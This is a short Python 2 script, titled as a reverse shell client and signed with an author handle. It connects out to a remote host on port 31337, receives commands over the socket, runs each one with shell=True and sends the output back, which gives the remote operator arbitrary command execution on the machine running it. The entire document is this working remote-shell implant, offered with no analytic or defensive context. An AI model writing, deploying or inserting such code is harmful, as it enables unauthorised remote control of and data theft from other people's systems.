#k4m1k4z13r Reverse Shell Client

import os
import socket
import subprocess

subprocess.call('clear' , shell=True)
global host
global port
global sock
sock= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
port = 31337
host = ""

def connect():
	try:
		print 'Trying to connect to %s:%s'%(host, port)
		sock.connect((host,port))
	except:
		print "Could not connect"
def executeandsend():
	command = sock.recv(4096)
	if command == 'quit' or command == 'exit':
		sock.close()

	else:
		proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		stdout_value = proc.stdout.read() + proc.stderr.read()
		send(stdout_value)
def send(arg):
	sock.send(arg)
	executeandsend()
connect()
executeandsend()
sock.close()
